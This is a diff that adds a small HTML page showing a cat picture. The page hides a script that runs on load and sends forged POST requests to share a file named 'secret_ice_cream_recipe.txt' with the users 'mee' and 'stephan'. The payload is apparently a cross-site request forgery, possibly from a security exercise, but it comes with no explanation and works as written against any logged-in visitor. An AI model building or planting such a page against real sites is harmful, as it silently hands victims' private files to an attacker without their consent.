@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+
+<script>
+  async function gimmeRecipe(file, user) {
+    const response = await fetch(`/files/${file}/share`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+      },
+      body: `userName=${user}`
+    });
+    return response.text();
+  }
+
+  gimmeRecipe("secret_ice_cream_recipe.txt","mee");
+  gimmeRecipe("secret_ice_cream_recipe.txt","stephan");
+</script>
+
+<img src="https://icatcare.org/app/uploads/2018/07/Thinking-of-getting-a-cat.png"/>
+
+</body>
+</html>
